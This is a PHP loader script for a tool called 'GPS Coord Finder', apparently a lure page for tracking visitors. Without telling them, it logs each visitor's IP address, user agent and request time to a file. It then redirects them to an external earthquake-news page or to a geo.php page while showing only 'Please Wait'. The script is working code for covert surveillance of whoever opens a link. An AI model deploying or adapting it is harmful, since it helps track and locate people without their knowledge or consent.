<?php

/*==================================================*/      
/*  Package   : GPS Coord Finder                    |/
/|  Deskripsi : A tool for detect visitor coordina- |/
/|              tes                                 |/
/|  Coder     : Zaid Harisah                        |/
/|  Facebook  : fb.com/zaidhdev                     |/
/|  Site      : http://zaidhdev.github.io           |/
/|   ______   _                                     |/
/|  |__  / | | | *** /                              |/
/|    / /| |_| | ** /                               |/
/|   / /_|  _  | * /                                |/
/|  /____|_| |_|  / github.com/zaidhdev             |/
/|                                                  */
/*==================================================*/

/**
 * Main loader script
 *
 * @package GPS-Coord-Finder
 */

function info_ip() {  
    if (getenv('HTTP_CLIENT_IP')) {
         $fip=getenv('HTTP_CLIENT_IP');
    }
    else if(getenv('HTTP_X_FORWARDED_FOR')){
         $fip=getenv('HTTP_X_FORWARDED_FOR');
    }
    else if(getenv('HTTP_X_FORWARDED')){
         $fip=getenv('HTTP_X_FORWARDED');
    }
    else if(getenv('HTTP_FORWARDED_FOR')){
        $fip=getenv('HTTP_FORWARDED_FOR');
    }
    else if(getenv('HTTP_FORWARDED')){
        $fip=getenv('HTTP_FORWARDED'); 
    }
    else if(getenv('REMOTE_ADDR')){
        $fip=getenv('REMOTE_ADDR');
    }
    else{
        $fip="UNKNOWN"; 
    }
    return $fip; 
}
    
date_default_timezone_set('Asia/Jakarta');
$info=[];
$info["IP Address"]=info_ip();
$info["User Agent"]=$_SERVER["HTTP_USER_AGENT"];
$info["OS"]=php_uname();
$info["Request Time"]=date("D\, d M Y \- H\:i\:s",$_SERVER["REQUEST_TIME"]);
$file=fopen("log.txt","a+");
fwrite($file,"\n \n --------------SysInfo------------- \n \n");
foreach ($info as $key => $val){
    fwrite($file, $key." = ".$val."\n \n");
}
fwrite($file, "\n ");
fclose($file);
if (!isset($_COOKIE["redir"])){
    if ((isset($_SERVER["HTTPS"]) AND $_SERVER["HTTPS"]=="on") OR (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) AND $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https")){
        setcookie("redir","yes");
        header("Location: http://rcorn.000webhostapp.com//it-dan-sarana-teknis/gempa-bumi/");
     }
     else{
        header("Location: geo.php");
    }
}
else{
header("Location: geo.php");  
}  
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>A Title</title>
        <link rel="icon" href="ico.png" type="image/png">
          <style>
            *{
               margin: 0 auto;
               padding: 0;
               }
            html{
                font-size: 10px;
                padding: 30px;
                }
            h2{
                font-size: 3.5em;
                color: green;
                }
        </style>       
        
    </head>
    <body>
        <h2>
            Please Wait
            <span class='d1'>.</span>
            <span class='d2'>.</span>
            <span class='d3'>.</span>
            <span class='d4'>.</span>
        </h2>
    </body>
</html>


